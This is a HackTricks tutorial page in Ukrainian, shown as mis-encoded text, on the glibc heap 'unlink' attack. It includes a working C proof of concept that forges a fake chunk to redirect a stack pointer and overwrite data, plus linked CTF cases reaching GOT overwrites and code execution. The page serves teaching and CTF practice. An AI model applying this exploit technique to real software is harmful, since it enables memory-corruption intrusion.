# –ê—Ç–∞–∫–∞ Unlink

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

–ö–æ–ª–∏ —Ü—é –∞—Ç–∞–∫—É –≤–∏—è–≤–∏–ª–∏, –≤–æ–Ω–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –¥–æ–∑–≤–æ–ª—è–ª–∞ WWW (Write What Where), –æ–¥–Ω–∞–∫, –±—É–ª–∏ –¥–æ–¥–∞–Ω—ñ **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∏**, —â–æ —Ä–æ–±–∏—Ç—å –Ω–æ–≤—É –≤–µ—Ä—Å—ñ—é –∞—Ç–∞–∫–∏ –±—ñ–ª—å—à —Ü—ñ–∫–∞–≤–æ—é, —Å–∫–ª–∞–¥–Ω–æ—é —Ç–∞ **–Ω–µ–∫–æ—Ä–∏—Å–Ω–æ—é**.

### –ü—Ä–∏–∫–ª–∞–¥ –∫–æ–¥—É:

<details>

<summary>–ö–æ–¥</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* –ê—Ç–∞–∫–∞ –Ω–µ –ø—Ä–∞—Ü—é—î, —è–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è tcaches (–ø—ñ—Å–ª—è –≤–µ—Ä—Å—ñ—ó 2.26)

### –ú–µ—Ç–∞

–¶—è –∞—Ç–∞–∫–∞ –¥–æ–∑–≤–æ–ª—è—î **–∑–º—ñ–Ω–∏—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ –±–ª–æ–∫ —Ç–∞–∫, —â–æ–± –≤—ñ–Ω –≤–∫–∞–∑—É–≤–∞–≤ –Ω–∞ 3 –∞–¥—Ä–µ—Å–∏ –ø–µ—Ä–µ–¥ —Å–æ–±–æ—é**. –Ø–∫—â–æ –Ω–æ–≤–µ –º—ñ—Å—Ü–µ (–Ω–∞–≤–∫–æ–ª–∏—à–Ω—ñ—Å—Ç—å, –¥–µ –∑–Ω–∞—Ö–æ–¥–∏–≤—Å—è –≤–∫–∞–∑—ñ–≤–Ω–∏–∫) –º—ñ—Å—Ç–∏—Ç—å —Ü—ñ–∫–∞–≤—ñ —Ä–µ—á—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ —ñ–Ω—à—ñ –∫–µ—Ä–æ–≤–∞–Ω—ñ –≤–∏–¥—ñ–ª–µ–Ω–Ω—è / —Å—Ç–µ–∫..., –º–æ–∂–ª–∏–≤–æ –∑—á–∏—Ç–∞—Ç–∏/–ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —ó—Ö, —â–æ–± –∑–∞–≤–¥–∞—Ç–∏ –±—ñ–ª—å—à–æ—ó —à–∫–æ–¥–∏.

* –Ø–∫—â–æ —Ü–µ–π –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –∑–Ω–∞—Ö–æ–¥–∏–≤—Å—è –≤ —Å—Ç–µ–∫—É, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç–µ–ø–µ—Ä –≤—ñ–Ω –≤–∫–∞–∑—É—î –Ω–∞ 3 –∞–¥—Ä–µ—Å–∏ –ø–µ—Ä–µ–¥ —Å–æ–±–æ—é —ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, –º–æ–∂–ª–∏–≤–æ, –º–æ–∂–µ –∑—á–∏—Ç–∞—Ç–∏ –π–æ–≥–æ —Ç–∞ –∑–º—ñ–Ω–∏—Ç–∏, –±—É–¥–µ –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—ñ–∫ —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑—ñ —Å—Ç–µ–∫—É –∞–±–æ –Ω–∞–≤—ñ—Ç—å –∑–º—ñ–Ω–∏—Ç–∏ –∞–¥—Ä–µ—Å—É –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è (–º–æ–∂–ª–∏–≤–æ) –±–µ–∑ —Ç–æ—Ä–∫–∞–Ω–Ω—è—Å—å –∫–∞–Ω–∞—Ä–µ–π–∫–∏
* –£ –ø—Ä–∏–∫–ª–∞–¥–∞—Ö CTF —Ü–µ–π –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –º–∞—Å–∏–≤—ñ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫—ñ–≤ –Ω–∞ —ñ–Ω—à—ñ –≤–∏–¥—ñ–ª–µ–Ω–Ω—è, —Ç–æ–º—É, –∑—Ä–æ–±–∏–≤—à–∏ –π–æ–≥–æ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ 3 –∞–¥—Ä–µ—Å–∏ –ø–µ—Ä–µ–¥ —ñ –º–∞—é—á–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∑—á–∏—Ç—É–≤–∞—Ç–∏ —Ç–∞ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –π–æ–≥–æ, –º–æ–∂–ª–∏–≤–æ –∑—Ä–æ–±–∏—Ç–∏ —ñ–Ω—à—ñ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ —ñ–Ω—à—ñ –∞–¥—Ä–µ—Å–∏.\
–û—Å–∫—ñ–ª—å–∫–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ —Ç–∞–∫–æ–∂ –∑—á–∏—Ç—É–≤–∞—Ç–∏/–ø–∏—Å–∞—Ç–∏ —ñ–Ω—à—ñ –≤–∏–¥—ñ–ª–µ–Ω–Ω—è, –≤—ñ–Ω –º–æ–∂–µ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –∞–±–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –Ω–æ–≤—É –∞–¥—Ä–µ—Å—É –≤ –¥–æ–≤—ñ–ª—å–Ω–∏—Ö –º—ñ—Å—Ü—è—Ö (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤ GOT).

### –í–∏–º–æ–≥–∏

* –î–µ—è–∫–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å —É –ø–∞–º'—è—Ç—ñ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Å—Ç–µ–∫), —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ –±–ª–æ–∫—ñ–≤, –Ω–∞–¥–∞—é—á–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –¥–µ—è–∫–∏–º –∞—Ç—Ä–∏–±—É—Ç–∞–º.
* –í–∏—Ç—ñ–∫ —Å—Ç–µ–∫—É –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –≤–∫–∞–∑—ñ–≤–Ω–∏–∫—ñ–≤ —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ –±–ª–æ–∫—É.

### –ê—Ç–∞–∫–∞

* –Ñ –∫—ñ–ª—å–∫–∞ –±–ª–æ–∫—ñ–≤ (–±–ª–æ–∫1 —Ç–∞ –±–ª–æ–∫2)
* –ê—Ç–∞–∫—É—é—á–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—é—î –≤–º—ñ—Å—Ç –±–ª–æ–∫—É1 —Ç–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –±–ª–æ–∫—É2.
* –£ –±–ª–æ–∫—É1 –∞—Ç–∞–∫—É—é—á–∏–π —Å—Ç–≤–æ—Ä—é—î —Å—Ç—Ä—É–∫—Ç—É—Ä—É —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ –±–ª–æ–∫—É:
* –©–æ–± –æ–±—ñ–π—Ç–∏ –∑–∞—Ö–∏—Å—Ç–∏, –≤—ñ–Ω –ø–µ—Ä–µ–∫–æ–Ω—É—î—Ç—å—Å—è, —â–æ –ø–æ–ª–µ `size` —î –ø—Ä–∞–≤–∏–ª—å–Ω–∏–º, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –ø–æ–º–∏–ª–∫–∏: `corrupted size vs. prev_size while consolidating`
* —ñ –ø–æ–ª—è `fd` —Ç–∞ `bk` —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ –±–ª–æ–∫—É –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —Ç–µ –º—ñ—Å—Ü–µ, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –±–ª–æ–∫—É1 –∑ –∑–º—ñ—â–µ–Ω–Ω—è–º–∏ -3 —Ç–∞ -2 –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ, —Ç–∞–∫ —â–æ `fake_chunk->fd->bk` —Ç–∞ `fake_chunk->bk->fd` –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ –ø–æ–∑–∏—Ü—ñ—é –≤ –ø–∞–º'—è—Ç—ñ (—Å—Ç–µ–∫), –¥–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è —Å–ø—Ä–∞–≤–∂–Ω—è –∞–¥—Ä–µ—Å–∞ –±–ª–æ–∫—É1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* –ó–∞–≥–æ–ª–æ–≤–∫–∏ –±–ª–æ–∫—É2 –∑–º—ñ–Ω–µ–Ω—ñ —Ç–∞–∫, —â–æ–± –≤–∫–∞–∑—É–≤–∞—Ç–∏, —â–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –±–ª–æ–∫ –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —ñ —â–æ —Ä–æ–∑–º—ñ—Ä - —Ü–µ —Ä–æ–∑–º—ñ—Ä —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ –±–ª–æ–∫—É.
* –ö–æ–ª–∏ –¥—Ä—É–≥–∏–π –±–ª–æ–∫ –≤–∏–≤—ñ–ª—å–Ω—è—î—Ç—å—Å—è, —Ç–æ–¥—ñ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —Ä–æ–∑'—î–¥–Ω–∞–Ω–Ω—è —Ü—å–æ–≥–æ —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ –±–ª–æ–∫—É:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* –†–∞–Ω—ñ—à–µ –±—É–ª–æ –∑—Ä–æ–±–ª–µ–Ω–æ —Ç–∞–∫, —â–æ `fake_chunk->fd->bk` —Ç–∞ `fake_chunk->bk->fd` –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —Ç–µ —Å–∞–º–µ –º—ñ—Å—Ü–µ (–º—ñ—Å—Ü–µ –≤ —Å—Ç–µ—Ü—ñ, –¥–µ –∑–±–µ—Ä—ñ–≥–∞–ª–∞—Å—è `chunk1`), —Ç–æ–º—É —Ü–µ –±—É–≤ –¥—ñ–π—Å–Ω–∏–π –∑–≤'—è–∑–∞–Ω–∏–π —Å–ø–∏—Å–æ–∫. –û—Å–∫—ñ–ª—å–∫–∏ **–æ–±–∏–¥–≤–∞ –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ —Ç–µ —Å–∞–º–µ –º—ñ—Å—Ü–µ**, —Ç—ñ–ª—å–∫–∏ –æ—Å—Ç–∞–Ω–Ω—ñ–π (`fake_chunk->bk->fd = fake_chunk->fd`) –±—É–¥–µ **–≤–∏–∫–æ–Ω–∞–Ω–∏–π**.
* –¶–µ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ **–ø–µ—Ä–µ–∑–∞–ø–∏—Å—É –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∞ –Ω–∞ –±–ª–æ–∫1 –≤ —Å—Ç–µ—Ü—ñ –Ω–∞ –∞–¥—Ä–µ—Å—É (–∞–±–æ –±–∞–π—Ç–∏), –∑–±–µ—Ä–µ–∂–µ–Ω—É 3 –∞–¥—Ä–µ—Å–∏ –ø–µ—Ä–µ–¥ –≤ —Å—Ç–µ—Ü—ñ**.
* –¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –∞—Ç–∞–∫—É—é—á–∏–π –∑–º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –≤–º—ñ—Å—Ç –±–ª–æ–∫—É1 –∑–Ω–æ–≤—É, –≤—ñ–Ω –∑–º–æ–∂–µ **–ø–∏—Å–∞—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—É —Å—Ç–µ–∫—É**, –º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∞–¥—Ä–µ—Å—É –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è, –æ–±—ñ–π—à–æ–≤—à–∏ –∫–∞–Ω–∞—Ä–µ–π–∫—É —Ç–∞ –∑–º—ñ–Ω–∏–≤—à–∏ –∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∞ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ –ª–æ–∫–∞–ª—å–Ω–∏—Ö –∑–º—ñ–Ω–Ω–∏—Ö. –ù–∞–≤—ñ—Ç—å –∑–Ω–æ–≤—É –∑–º—ñ–Ω—é—é—á–∏ –∞–¥—Ä–µ—Å—É –±–ª–æ–∫—É1, –∑–±–µ—Ä–µ–∂–µ–Ω—É –≤ —Å—Ç–µ—Ü—ñ, –Ω–∞ —ñ–Ω—à–µ –º—ñ—Å—Ü–µ, –¥–µ —è–∫—â–æ –∞—Ç–∞–∫—É—é—á–∏–π –∑–º–æ–∂–µ –∑–Ω–æ–≤—É –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –≤–º—ñ—Å—Ç –±–ª–æ–∫—É1, –≤—ñ–Ω –∑–º–æ–∂–µ –ø–∏—Å–∞—Ç–∏ –¥–µ –∑–∞–≤–≥–æ–¥–Ω–æ.
* –ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ —á–µ—Ä–µ–∑ —Ç–µ, —â–æ **–∞–¥—Ä–µ—Å–∏ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ —Å—Ç–µ—Ü—ñ**. –†–∏–∑–∏–∫ —Ç–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –º–æ–∂—É—Ç—å –∑–∞–ª–µ–∂–∞—Ç–∏ –≤—ñ–¥ **—Ç–æ–≥–æ, –¥–µ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –∞–¥—Ä–µ—Å–∏ —Ñ–∞–ª—å—à–∏–≤–æ–≥–æ –±–ª–æ–∫—É**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* –•–æ—á–∞ –±—É–ª–æ –± –¥–∏–≤–Ω–æ –∑–Ω–∞–π—Ç–∏ –∞—Ç–∞–∫—É unlink –Ω–∞–≤—ñ—Ç—å —É CTF, –æ—Å—å –¥–µ—è–∫—ñ –æ–ø–∏—Å–∏, –¥–µ —Ü—è –∞—Ç–∞–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∞—Å—è:
* –ü—Ä–∏–∫–ª–∞–¥ CTF: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* –£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ, –∑–∞–º—ñ—Å—Ç—å —Å—Ç–µ–∫—É —î –º–∞—Å–∏–≤ –∞–¥—Ä–µ—Å, –≤–∏–¥—ñ–ª–µ–Ω–∏—Ö –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é malloc. –ê—Ç–∞–∫–∞ unlink –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –¥–ª—è –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –≤–∏–¥—ñ–ª–µ–Ω–Ω—è –±–ª–æ–∫—É —Ç—É—Ç, —Ç–æ–º—É –º–æ–∂–ª–∏–≤–æ –∫–µ—Ä—É–≤–∞—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∞–º–∏ –º–∞—Å–∏–≤—É –≤–∏–¥—ñ–ª–µ–Ω–∏—Ö –∞–¥—Ä–µ—Å. –ü–æ—Ç—ñ–º —î —â–µ –æ–¥–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤–º—ñ—Å—Ç –±–ª–æ–∫—ñ–≤ –∑–∞ —Ü–∏–º–∏ –∞–¥—Ä–µ—Å–∞–º–∏, —â–æ –¥–æ–∑–≤–æ–ª—è—î –≤–∫–∞–∑—É–≤–∞—Ç–∏ –∞–¥—Ä–µ—Å–∏ –Ω–∞ GOT, –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –∞–¥—Ä–µ—Å–∏ —Ñ—É–Ω–∫—Ü—ñ–π –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≤–∏—Ç–æ–∫—ñ–≤ —Ç–∞ RCE.
* –Ü–Ω—à–∏–π –ø—Ä–∏–∫–ª–∞–¥ CTF: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
* –¢–æ—á–Ω–æ —Ç–∞–∫ —Å–∞–º–æ, —è–∫ —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ, —î –º–∞—Å–∏–≤ –∞–¥—Ä–µ—Å –≤–∏–¥—ñ–ª–µ–Ω—å. –ú–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∞—Ç–∞–∫—É unlink, —â–æ–± –∞–¥—Ä–µ—Å–∞ –ø–µ—Ä—à–æ–≥–æ –≤–∏–¥—ñ–ª–µ–Ω–Ω—è –≤–∫–∞–∑—É–≤–∞–ª–∞ –Ω–∞ –∫—ñ–ª—å–∫–∞ –ø–æ–∑–∏—Ü—ñ–π –ø–µ—Ä–µ–¥ –ø–æ—á–∞—Ç–∫–æ–º –º–∞—Å–∏–≤—É, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ —Ü–µ –≤–∏–¥—ñ–ª–µ–Ω–Ω—è –Ω–∞ –Ω–æ–≤—ñ–π –ø–æ–∑–∏—Ü—ñ—ó. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∏ —ñ–Ω—à–∏—Ö –≤–∏–¥—ñ–ª–µ–Ω—å, —â–æ–± –≤–∫–∞–∑—É–≤–∞—Ç–∏ –Ω–∞ GOT atoi, –≤–∏–≤–µ—Å—Ç–∏ –π–æ–≥–æ, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–∏—Ç—ñ–∫ libc, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ GOT atoi –∞–¥—Ä–µ—Å–æ—é –¥–æ –æ–¥–Ω–æ–≥–æ –≥–∞–¥–∂–µ—Ç–∞.
* –ü—Ä–∏–∫–ª–∞–¥ CTF –∑ –≤–ª–∞—Å–Ω–∏–º–∏ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏ malloc —Ç–∞ free, —è–∫—ñ –∑–ª–æ–≤–∂–∏–≤–∞—é—Ç—å –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—é, –¥—É–∂–µ —Å—Ö–æ–∂–æ—é –Ω–∞ –∞—Ç–∞–∫—É unlink: [https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw17\_minesweeper/index.html)
* –Ñ –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è, —è–∫–µ –¥–æ–∑–≤–æ–ª—è—î –∫–µ—Ä—É–≤–∞—Ç–∏ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫–∞–º–∏ FD —Ç–∞ BK –≤–ª–∞—Å–Ω–æ–≥–æ malloc, —è–∫–∏–π –±—É–¥–µ (–≤–ª–∞—Å–Ω–æ—Ä—É—á) –≤–∏–≤—ñ–ª—å–Ω–µ–Ω–∏–π. –ö—Ä—ñ–º —Ç–æ–≥–æ, —É –∫—É–ø—ñ —î –±—ñ—Ç exec, —Ç–æ–º—É –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –∞–¥—Ä–µ—Å—É –∫—É–ø–∏ —Ç–∞ –≤–∫–∞–∑—É–≤–∞—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—é –∑ GOT –Ω–∞ –∫—É–ø—É –∑ shellcode –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è AWS Red Team Expert (ARTE) –≤—ñ–¥ HackTricks**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**–ù–∞–≤—á–∞–Ω–Ω—è GCP Red Team Expert (GRTE) –≤—ñ–¥ HackTricks**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
{% endhint %}
